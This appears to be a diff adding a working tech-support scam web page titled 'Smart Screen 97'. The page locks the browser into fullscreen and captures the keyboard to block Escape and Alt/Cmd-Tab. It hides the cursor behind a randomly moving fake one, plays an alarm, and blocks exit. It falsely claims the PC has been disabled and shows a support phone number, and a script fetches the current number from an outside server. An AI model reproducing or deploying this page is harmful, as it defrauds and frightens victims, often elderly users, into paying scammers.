@@ -1,0 +1,397 @@
+<!DOCTYPE html><html><head>
+     <meta charset="utf-8">
+    <title>Smart Screen 97</title>
+<script src="js/jquery.min.js"></script>
+<style>
+  .modal23-dialog {
+            position: relative;
+            max-width: 420px;
+            margin: 0rem auto;
+            pointer-events: none;
+            display:    none;
+        }
+        .mod_cross img{
+               width: 14px;
+    height: auto;
+    position: absolute;
+    right: 19px;
+    top: 10px;
+        }
+.modal23-content {
+    margin-top: 70%;
+    cursor: none;
+            position: absolute;
+            z-index: 999999999999;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            width: 100%;
+            pointer-events: auto;
+            background-color: #ffffff;
+            color: #000;
+            background-clip: padding-box;
+            border: 1px solid rgba(0, 0, 0, .2);
+            border-radius: 15px;
+            outline: 0;
+    height:160px;
+            box-shadow: 0 0 5px 1px #7a7a7a;
+        }
+.modal23-body {
+            color: rgb(255, 255, 255);
+            display: block;
+            font-family: arial, sans-serif;
+            font-size: 15px;
+            position: relative;
+            -ms-flex: 1 1 auto;
+            flex: 1 1 auto;
+            padding: 15px 15px 0px 15px;
+            color: #000;
+            font-size: 13px;
+        }
+.modal23-p {
+            font-size: 17px;
+            margin-bottom: 10px;
+                font-weight: 600;
+        }
+.modal23-p2{
+ font-size: 14px;
+}
+.modal23-footer {
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-align: center;
+            align-items: center;
+            -ms-flex-pack: end;
+            justify-content: flex-end;
+            padding: 0px 17px 17px 17px;
+        }
+.btn-primary23 {
+            color: #fff;
+            background-color: #2271ff;
+        }
+.btn23 {
+            font-family: arial, sans-serif;
+            display: inline-block;
+            font-weight: 500;
+            text-align: center;
+            white-space: nowrap;
+            vertical-align: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            border: 2px solid #ffffff;
+            /*box-shadow: 0 0 1px 2px #005bff;*/
+            padding: 5px 21px;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #ffffff;
+            border-radius: .25rem;
+            transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+        }
+.btn23:not(:disabled):not(.disabled) {
+            cursor: none;
+        }
+
+
+/*************** media queries end ***********/
+.last_box{
+    padding: 10px;
+    background-color: #fff;
+}
+.cr_bt{
+    background-color: #fff;
+    padding: 10px;
+}
+.cr_bt img{
+    width: 3%;
+}
+#txtadd{float: left;color: #fff;    font-size: 17px;}
+#txts1{float: right;}
+#txts1 a{
+    color: #fff;
+    text-decoration: none;
+    font-size: 12px;
+}
+#up_new{
+    position: absolute;
+    top: 6%;
+    z-index: 999999;
+    left: 36%;
+    background: #1a73e8;
+    width: 440px;
+    text-align: left;
+    padding-top: 4px;
+    display: none;
+    color: #FFFFFF;
+    padding-left: 20px;
+    padding-right: 20px;
+}
+</style>
+<style>
+  .black {
+width: 100%;
+height: 100%;
+background-color: rgb(0 0 0 / 47%);
+opacity: 5.5;
+transition: 1s;
+position: absolute;
+top: 0px;
+left:0;
+cursor: none;
+overflow-x: hidden;
+overflow-y: hidden;
+}
+</style>
+<style>
+.blink {
+animation: blink-animation 1s steps(5, start) infinite;
+-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+.blink2 {
+animation: blink-animation 1s steps(5, start) infinite;
+-webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+@keyframes blink-animation {
+to {
+visibility: hidden;
+}
+}
+@-webkit-keyframes blink-animation {
+to {
+visibility: hidden;
+}
+}
+
+</style>
+<style>
+
+.buttons.blink {
+  font-family: arial, sans-serif;
+  font-weight: 500;
+  text-align: center;
+  white-space: nowrap;
+  vertical-align: middle;
+  border: 2px solid #ffffff;
+  padding: 5px 21px;
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: .25rem;
+  background-color: #005bff;
+  color: #fff;
+
+}
+
+</style>
+<script>
+  var button = document.getElementById("myButton");
+setInterval(function() {
+  button.classList.toggle("btn-blink");
+}, 1000);
+
+</script>
+
+<script>
+
+    let closePP = document.querySelector('.btn23-primary');
+    let overlay = document.querySelector('.modal23-dialog');
+
+    let KEY_ESC = 27;
+    document.onkeydown = function(e) {
+        if (e.keyCode == KEY_ESC) {
+           document.querySelector('.wrapper').style.cursor="auto";
+           setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 500);
+
+       }
+   }
+
+
+
+   setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 500);
+
+   document.addEventListener('click', () => {
+
+
+    document.getElementById("beeppeep").play();
+
+    //document.documentElement.requestFullscreen();
+    document.body.requestFullscreen().then(
+    () => {
+      const keys = [
+        { code: 'Escape' },
+        { code: 'Tab', altKey: true },
+        { code: 'Tab', metaKey: true },
+      ];
+      //navigator.requestSystemKeyboardLock(keys);
+      navigator.keyboard.lock();
+    });
+    document.addEventListener('keydown', event => {
+      if (event.code == 'Escape') {
+        console.dir('escape punched');
+      }
+    }, false);
+    document.querySelector('.modal23-dialog').style.display="none";
+    document.querySelector('.wrapper').style.cursor="none";
+    
+
+});
+
+
+
+   document.addEventListener('mouseleave', showDontLeavePopup);
+   var popupShows = 0;
+   function showDontLeavePopup() {
+
+    document.querySelector('.modal-dialog23').style.display="block";
+    
+
+} 
+
+
+        // document.querySelector('.btn-primary').onclick = function() {
+        //     document.querySelector('.modal-dialog').style.display = 'none';
+        // };
+
+
+    </script><script defer data-domain="ninja.dev" src="https://plausible.io/js/script.js"></script>
+<script>
+$(document).ready(function() {
+  //-------------- fake cursor -----------------------------------
+  function makeNewPosition() {
+    var h = $(window).height() - 50,
+      w = $(window).width() - 50,
+      nh = Math.floor(Math.random() * h),
+      nw = Math.floor(Math.random() * w);
+    return [nh, nw];
+  }
+
+  function animateDiv() {
+    var newq = makeNewPosition(),
+      oldq = $(".fakeCursor").offset(),
+      speed = calcSpeed([oldq.top, oldq.left], newq);
+    $(".fakeCursor").animate({ top: newq[0], left: newq[1] }, speed, function() {
+      animateDiv();
+    });
+  }
+
+  function calcSpeed(prev, next) {
+    var x = Math.abs(prev[1] - next[1]),
+      y = Math.abs(prev[0] - next[0]),
+      greatest = x > y ? x : y,
+      speedModifier = 0.3,
+      speed = Math.ceil(greatest / speedModifier);
+    return speed;
+  }
+
+  animateDiv();
+});
+
+document.addEventListener('click', () => {
+  document.getElementById("beeppeep").play();
+  document.body.requestFullscreen().then(() => {
+    const keys = [
+      { code: 'Escape' },
+      { code: 'Tab', altKey: true },
+      { code: 'Tab', metaKey: true },
+    ];
+    navigator.keyboard.lock();
+  });
+
+  document.addEventListener('keydown', event => {
+    if (event.code == 'Escape') {
+      console.dir('escape punched');
+    }
+  }, false);
+
+  // Send a Google Analytics event
+  gtag('event', 'click', {
+    'event_category': 'fullscreen',
+    'event_action': 'click'
+  });
+
+  // Remove the "black" class from the div
+  var blackDiv = document.querySelector('.black');
+  if (blackDiv) {
+    blackDiv.parentNode.removeChild(blackDiv);
+  }
+});
+
+</script>
+
+
+
+
+</head>
+
+<body id="map" onbeforeunload="return myFunction()" style="overflow: hidden;cursor:none;">
+
+
+
+<audio id="beeppeep" autoplay="">
+    <source src="media/_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<iframe src="iframe.html" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+</iframe>
+
+  <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+      <div class="black" style="height: 100%;"></div>
+  </a>
+  <div class="modal23-dialog" style="display: block;">
+            <div class="modal23-content">
+              <div class="modal23-body">
+                <table>
+                  <tbody>
+                    <tr>
+                      <td>
+                        <div class="mod_cross"><img src="images/cross-bl.png"></div>
+                        <h2 class="text_block modal23-p2">Access to this PC has been disabled! </h2>
+                        <h3>Please contact support.<img src="images/winlo.png" class="blink" alt="" style="width: 25px;vertical-align: sub;">Call Us :+1-844-570-3405 </span></h3>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    <div class="modal23-footer">
+        <button type="button" class="btn23 btn-primary23">Continue</button>
+        <button type="button" class="fr buttons blink">Leave</button>
+
+    </div>
+</div>
+</div>
+<script>
+    fetch('https://homiehelp.com/fb.json', {
+        method: 'GET',
+        headers: {
+            'Accept': 'application/json',
+        },
+    })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            // Parse the response as JSON
+            return response.json();
+        })
+        .then(data => {
+            const tfnValue = data.tfn;
+
+            const tfnElement = document.getElementById('tfn-value');
+            tfnElement.textContent = tfnValue;
+
+        })
+        .catch(error => {
+            // Handle any errors (network issues, invalid JSON, etc.)
+            console.error('Error fetching or processing data:', error);
+
+            // Update HTML with an error message if something goes wrong
+            const tfnElement = document.getElementById('tfn-value');
+            tfnElement.textContent = 'Error loading tfn value';
+        });
+</script>
+
+
+</body></html>
